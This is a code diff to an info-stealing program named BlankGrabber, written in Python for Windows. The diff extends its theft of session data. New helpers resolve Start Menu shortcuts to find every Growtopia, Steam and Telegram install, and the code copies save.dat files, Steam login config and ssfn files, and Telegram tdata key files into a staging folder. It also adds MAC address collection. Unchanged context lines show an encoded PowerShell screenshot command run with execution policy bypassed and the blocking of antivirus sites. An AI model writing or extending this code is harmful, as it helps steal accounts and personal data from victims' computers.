@@ -297,51 +297,36 @@ class Utility:
             if not found:
                 passwords[profile] = '(None)'
         return passwords
+
+    @staticmethod
+    def GetLnkTarget(path_to_lnk: str) -> str | None: # Finds the target of the given shortcut file
+        target = None
+        if os.path.isfile(path_to_lnk):
+            output = subprocess.run('wmic path win32_shortcutfile where name="%s" get target /value' % os.path.abspath(path_to_lnk).replace("\\", "\\\\"), shell= True, capture_output= True).stdout.decode()
+            if output:
+                for line in output.splitlines():
+                    if line.startswith("Target="):
+                        temp = line.lstrip("Target=").strip()
+                        if os.path.exists(temp):
+                            target = temp
+                            break
+
+        return target
     
     @staticmethod
-    def Tree(path: str | tuple, prefix: str = "", base_has_files: bool = False): # Generates a tree for the given path
-        def GetSize(_path: str) -> int:
-            size = 0
-            if os.path.isfile(_path):
-                size += os.path.getsize(_path)
-            elif os.path.isdir(_path):
-                for root, dirs, files in os.walk(_path):
-                    for file in files:
-                        size += os.path.getsize(os.path.join(root, file))
-                    for _dir in dirs:
-                        size += GetSize(os.path.join(root, _dir))
+    def GetLnkFromStartMenu(app: str) -> list[str]: # Finds the shortcut to an app in the start menu
+        shortcutPaths = []
+        startMenuPaths = [
+            os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs"),
+            os.path.join("C:\\", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs")
+        ]
+        for startMenuPath in startMenuPaths:
+            for root, _, files in os.walk(startMenuPath):
+                for file in files:
+                    if file.lower() == "%s.lnk" % app.lower():
+                        shortcutPaths.append(os.path.join(root, file))
         
-            return size
-        
-        DIRICON   = chr(128194) + " - "
-        FILEICON  = chr(128196) + " - "
-        EMPTY     = "    "
-        PIPE      = chr(9474) + "   "
-        TEE       = "".join(chr(x) for x in (9500, 9472, 9472)) + " "
-        ELBOW     = "".join(chr(x) for x in (9492, 9472, 9472)) + " "
-
-        if prefix == "":
-            if isinstance(path, str):
-                yield DIRICON + os.path.basename(os.path.abspath(path))
-            elif isinstance(path, tuple):
-                yield DIRICON + path[1]
-                path = path[0]
-        
-        contents = os.listdir(path)
-        folders = (os.path.join(path, x) for x in contents if os.path.isdir(os.path.join(path, x)))
-        files = (os.path.join(path, x) for x in contents if os.path.isfile(os.path.join(path, x)))
-
-        body = [TEE for _ in range(len(contents) - 1)] + [ELBOW]
-        count = 0
-
-        for item in folders:
-            yield prefix + body[count] + DIRICON + os.path.basename(item) + " (%d items, %.2f KB)" % (len(os.listdir(item)), GetSize(item)/1024)
-            yield from Utility.Tree(item, prefix + (EMPTY if count == len(body) - 1 else PIPE) if prefix else (PIPE if count == 0 or base_has_files else EMPTY), files and not prefix)
-            count += 1
-        
-        for item in files:
-            yield prefix + body[count] + FILEICON + os.path.basename(item) + " (%.2f KB)" % (GetSize(item)/1024)
-            count += 1
+        return shortcutPaths
     
     @staticmethod
     def IsAdmin() -> bool: # Checks if the program has administrator permissions or not
@@ -894,8 +879,8 @@ class BlankGrabber:
     TelegramSessionsCount: int = 0 # Number of Telegram sessions collected
     CommonFilesCount: int = 0 # Number of files collected
     WalletsCount: int = 0 # Number of different crypto wallets collected
-    Screenshot: bool = False # Indicates whether screenshot was collected or not
-    SystemInfo: bool = False # Indicates whether system info was collected or not
+    ScreenshotTaken: bool = False # Indicates whether screenshot was collected or not
+    SystemInfoStolen: bool = False # Indicates whether system info was collected or not
     SteamStolen: bool = False # Indicates whether Steam account was stolen or not
     EpicStolen: bool = False # Indicates whether Epic Games account was stolen or not
     UplayStolen: bool = False # Indicates whether Uplay account was stolen or not
@@ -1017,15 +1002,27 @@ class BlankGrabber:
     def StealGrowtopia(self) -> None: # Steals Growtopia session files
         if Settings.CaptureGames:
             Logger.info("Stealing Growtopia session")
-            targetFilePath = os.path.join(os.getenv("localappdata"), "Growtopia", "save.dat")
+
+            growtopiadirs = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu("Growtopia")] if x is not None])]
             saveToPath = os.path.join(self.TempFolder, "Games", "Growtopia")
-            if os.path.isfile(targetFilePath):
-                try:
-                    os.makedirs(saveToPath, exist_ok= True)
-                    shutil.copy(targetFilePath, os.path.join(saveToPath, "save.dat"))
-                    self.GrowtopiaStolen = True
-                except Exception:
-                    pass
+            multiple = len(growtopiadirs) > 1
+
+            for index, path in enumerate(growtopiadirs):
+                targetFilePath = os.path.join(path, "save.dat")
+                if os.path.isfile(targetFilePath):
+                    try:
+                        _saveToPath = saveToPath
+                        if multiple:
+                            _saveToPath = os.path.join(saveToPath, "Profile %d" % (index + 1))
+                        os.makedirs(_saveToPath, exist_ok= True)
+                        shutil.copy(targetFilePath, os.path.join(_saveToPath, "save.dat"))
+                        self.GrowtopiaStolen = True
+                    except Exception:
+                        shutil.rmtree(_saveToPath)
+            
+            if multiple and self.GrowtopiaStolen:
+                with open(os.path.join(saveToPath, "Info.txt"), "w") as file:
+                    file.write("Multiple Growtopia installations are found, so the files for each of them are put in different Profiles")
                     
     @Errors.Catch
     def StealEpic(self) -> None: #Steals Epic accounts
@@ -1054,23 +1051,35 @@ class BlankGrabber:
         if Settings.CaptureGames:
             Logger.info("Stealing Steam session")
             saveToPath = os.path.join(self.TempFolder, "Games", "Steam")
-            steamPath = os.path.join("C:\\", "Program Files (x86)", "Steam")
-            steamConfigPath = os.path.join(steamPath, "config")
-            if os.path.isdir(steamConfigPath):
-                loginFile = os.path.join(steamConfigPath, "loginusers.vdf")
-                if os.path.isfile(loginFile):
-                    with open(loginFile) as file:
-                        contents = file.read()
-                    if '"RememberPassword"\t\t"1"' in contents:
-                        try:
-                            os.makedirs(saveToPath, exist_ok= True)
-                            shutil.copytree(steamConfigPath, os.path.join(saveToPath, "config"), dirs_exist_ok= True)
-                            for item in os.listdir(steamPath):
-                                if item.startswith("ssfn") and os.path.isfile(os.path.join(steamPath, item)):
-                                    shutil.copy(os.path.join(steamPath, item), os.path.join(saveToPath, item))
-                                    self.SteamStolen = True
-                        except Exception:
-                            pass
+            steamPaths  = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu("Steam")] if x is not None])]
+            multiple = len(steamPaths) > 1
+
+            if not steamPaths:
+                steamPaths.append("C:\\Program Files (x86)\\Steam")
+            
+            for index, steamPath in enumerate(steamPaths):
+                steamConfigPath = os.path.join(steamPath, "config")
+                if os.path.isdir(steamConfigPath):
+                    loginFile = os.path.join(steamConfigPath, "loginusers.vdf")
+                    if os.path.isfile(loginFile):
+                        with open(loginFile) as file:
+                            contents = file.read()
+                        if '"RememberPassword"\t\t"1"' in contents:
+                            try:
+                                _saveToPath = saveToPath
+                                if multiple:
+                                    _saveToPath = os.path.join(saveToPath, "Profile %d" % (index + 1))
+                                os.makedirs(_saveToPath, exist_ok= True)
+                                shutil.copytree(steamConfigPath, os.path.join(_saveToPath, "config"), dirs_exist_ok= True)
+                                for item in os.listdir(steamPath):
+                                    if item.startswith("ssfn") and os.path.isfile(os.path.join(steamPath, item)):
+                                        shutil.copy(os.path.join(steamPath, item), os.path.join(_saveToPath, item))
+                                        self.SteamStolen = True
+                            except Exception:
+                                pass
+            if self.SteamStolen and multiple:
+                with open(os.path.join(saveToPath, "Info.txt"), "w") as file:
+                    file.write("Multiple Steam installations are found, so the files for each of them are put in different Profiles")
     
     @Errors.Catch
     def StealUplay(self) -> None: # Steals Uplay accounts
@@ -1199,7 +1208,15 @@ class BlankGrabber:
                 os.makedirs(saveToDir, exist_ok= True)
                 with open(os.path.join(saveToDir, "System Info.txt"), "w") as file:
                     file.write(output)
-                self.SystemInfoCount = True
+                self.SystemInfoStolen = True
+            
+            process = subprocess.run("getmac", capture_output= True, shell= True)
+            output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
+            if output:
+                os.makedirs(saveToDir, exist_ok= True)
+                with open(os.path.join(saveToDir, "MAC Addresses.txt"), "w") as file:
+                    file.write(output)
+                self.SystemInfoStolen = True
         
     @Errors.Catch
     def GetDirectoryTree(self) -> None: # Makes directory trees of the common directories
@@ -1232,7 +1249,7 @@ class BlankGrabber:
                 os.makedirs(os.path.join(self.TempFolder, "Directories"), exist_ok= True)
                 with open(os.path.join(self.TempFolder, "Directories", "{}.txt".format(key)), "w", encoding= "utf-8") as file:
                     file.write(value)
-                self.SystemInfo = True
+                self.SystemInfoStolen = True
     
     @Errors.Catch
     def GetClipboard(self) -> None: # Copies text from the clipboard
@@ -1297,7 +1314,7 @@ class BlankGrabber:
             Logger.info("Taking screenshot")
             command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
             if subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", command], shell=True, capture_output=True, cwd= self.TempFolder).returncode == 0:
-                self.Screenshot = True
+                self.ScreenshotTaken = True
 
     @Errors.Catch
     def BlockSites(self) -> None: # Initiates blocking of AV related sites and kill any browser instance for them to reload the hosts file
@@ -1397,30 +1414,24 @@ class BlankGrabber:
         if Settings.CaptureTelegram:
             Logger.info("Stealing telegram sessions")
 
-            telegramPaths = []
-            loginPaths = []
-            files = []
-            dirs = []
-            has_key_datas = False
-
-            process = subprocess.run("reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", shell= True, capture_output= True)
-            if process.returncode == 0:
-                paths = [x for x in process.stdout.decode(errors= "ignore").splitlines() if x.strip()]
-                for path in paths:
-                    process = subprocess.run('reg query "{}" /v DisplayIcon'.format(path), shell= True, capture_output= True)
-                    if process.returncode == 0:
-                        path = process.stdout.strip().decode(errors= "ignore").split(" " * 4)[-1].split(",")[0]
-                        if "telegram" in path.lower():
-                            telegramPaths.append(os.path.dirname(path))
+            telegramPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu("Telegram")] if x is not None])]
+            multiple = len(telegramPaths) > 1
+            saveToDir = os.path.join(self.TempFolder, "Messenger", "Telegram")
             
             if not telegramPaths:
                 telegramPaths.append(os.path.join(os.getenv("appdata"), "Telegram Desktop"))
 
-            for path in telegramPaths:
-                path = os.path.join(path, "tdata")
-                if os.path.isdir(path):
-                    for item in os.listdir(path):
-                        itempath = os.path.join(path, item)
+
+            for index, telegramPath in enumerate(telegramPaths):
+                tDataPath = os.path.join(telegramPath, "tdata")
+                loginPaths = []
+                files = []
+                dirs = []
+                has_key_datas = False
+
+                if os.path.isdir(tDataPath):
+                    for item in os.listdir(tDataPath):
+                        itempath = os.path.join(tDataPath, item)
                         if item == "key_datas":
                             has_key_datas = True
                             loginPaths.append(itempath)
@@ -1433,22 +1444,31 @@ class BlankGrabber:
                     for filename in files:
                         for dirname in dirs:
                             if dirname + "s" == filename:
-                                loginPaths.extend([os.path.join(path, x) for x in (filename, dirname)])
+                                loginPaths.extend([os.path.join(tDataPath, x) for x in (filename, dirname)])
             
-            if has_key_datas and len(loginPaths) - 1 > 0:
-                saveToDir = os.path.join(self.TempFolder, "Messenger", "Telegram")
-                os.makedirs(saveToDir, exist_ok= True)
-                for path in loginPaths:
-                    try:
-                        if os.path.isfile(path):
-                            shutil.copy(path, os.path.join(saveToDir, os.path.basename(path)))
-                        else:
-                            shutil.copytree(path, os.path.join(saveToDir, os.path.basename(path)), dirs_exist_ok= True)
-                    except Exception:
-                        shutil.rmtree(saveToDir)
-                        return
-                
-                self.TelegramSessionsCount += int((len(loginPaths) - 1)/2)
+                if has_key_datas and len(loginPaths) - 1 > 0:
+                    _saveToDir = saveToDir
+                    if multiple:
+                        _saveToDir = os.path.join(_saveToDir, "Profile %d" % (index + 1))
+                    os.makedirs(_saveToDir, exist_ok= True)
+
+                    failed = False
+                    for loginPath in loginPaths:
+                        try:
+                            if os.path.isfile(loginPath):
+                                shutil.copy(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)))
+                            else:
+                                shutil.copytree(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)), dirs_exist_ok= True)
+                        except Exception:
+                            shutil.rmtree(_saveToDir)
+                            failed = True
+                            break
+                    if not failed:
+                        self.TelegramSessionsCount += int((len(loginPaths) - 1)/2)
+            
+            if self.TelegramSessionsCount and multiple:
+                with open(os.path.join(saveToDir, "Info.txt"), "w") as file:
+                    file.write("Multiple Telegram installations are found, so the files for each of them are put in different Profiles")
     
     @Errors.Catch
     def StealDiscordTokens(self) -> None: # Steals Discord tokens
@@ -1581,8 +1601,8 @@ class BlankGrabber:
             "Steam Session" : "Yes" if self.SteamStolen else "No",
             "Uplay Session" : "Yes" if self.UplayStolen else "No",
             "Growtopia Session" : "Yes" if self.GrowtopiaStolen else "No",
-            "Screenshot" : "Yes" if self.Screenshot else "No",
-            "System Info" : "Yes" if self.SystemInfo else "No"
+            "Screenshot" : "Yes" if self.ScreenshotTaken else "No",
+            "System Info" : "Yes" if self.SystemInfoStolen else "No"
         }
         
         grabbedInfo = "\n".join([key + " : " + str(value) for key, value in collection.items()])
